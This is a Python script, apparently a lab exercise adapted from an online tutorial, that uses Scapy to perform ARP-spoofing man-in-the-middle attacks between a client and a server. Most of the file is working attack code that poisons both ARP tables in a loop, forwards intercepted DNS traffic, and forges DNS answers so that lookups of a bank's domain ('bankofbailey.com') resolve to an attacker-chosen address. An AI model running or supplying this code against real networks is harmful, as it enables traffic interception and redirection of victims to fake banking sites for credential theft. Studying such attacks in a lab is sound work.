# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
# Sources
#########
# http://www.osric.com/chris/accidental-developer/2020/04/modifying-a-packet-capture-with-scapy/
#########
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=1, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    try:
        yes,no = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP))
        for r in yes:
            x,y = r
            return y[ARP].hwsrc
    except:
        debug("Error resolving MAC for {}".format(IP))
        return ""

# Helper function
def makeARP(dst,src,hw_src,hw_dst,gw="ff:ff:ff:ff:ff:ff"):
    return ARP(op=2,pdst=dst,psrc=src,hwdst=hw_dst,hwsrc=hw_src)

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP,attackerMAC,clientIP,clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP,attackerMAC,serverIP,serverMAC) # TODO: Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    # configuring layer 2 
    spoofed = Ether(src=srcMAC,dst=dstMAC)/makeARP(dstIP,srcIP,srcMAC,dstMAC)
    sendp(spoofed.build())


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(makeARP(dstIP,srcIP,srcMAC,dstMAC))


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
    try:
        # Dont route own packets
        if packet.haslayer(Ether) and packet[Ether].src == attackerMAC:
            pass
        # server --> client
        elif packet.haslayer(UDP) and packet.haslayer(DNS) \
          and packet[UDP].sport == 53:
            if b'bankofbailey.com' in packet[DNS].qd.qname:
                qrr = DNSRR(rrname=packet[DNS].qd.qname,rdata='10.4.63.200')
                # create a fake packet with desired fields
                forged = packet
                # layer 2 forwarding logic 
                forged[Ether].dst = clientMAC
                forged[Ether].src = attackerMAC
                forged[DNS].an = qrr
                forged[DNS].ancount |= 1 # turn on answer count bit

                # these change and can be removed to avoid error detection
                del(forged[UDP].len)
                del(forged[UDP].chksum)
                del(forged[IP].len)
                del(forged[IP].chksum)
                sendp(forged.build())
            else:
                packet[Ether].dst = clientMAC
                packet[Ether].src = attackerMAC
                sendp(packet.build())
        # client --> server
        elif packet.haslayer(UDP) and packet[UDP].dport == 53:
            # layer 2 forwarding logic
            packet[Ether].dst = serverMAC
            packet[Ether].src = attackerMAC
            sendp(packet.build())
    except:
        pass

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
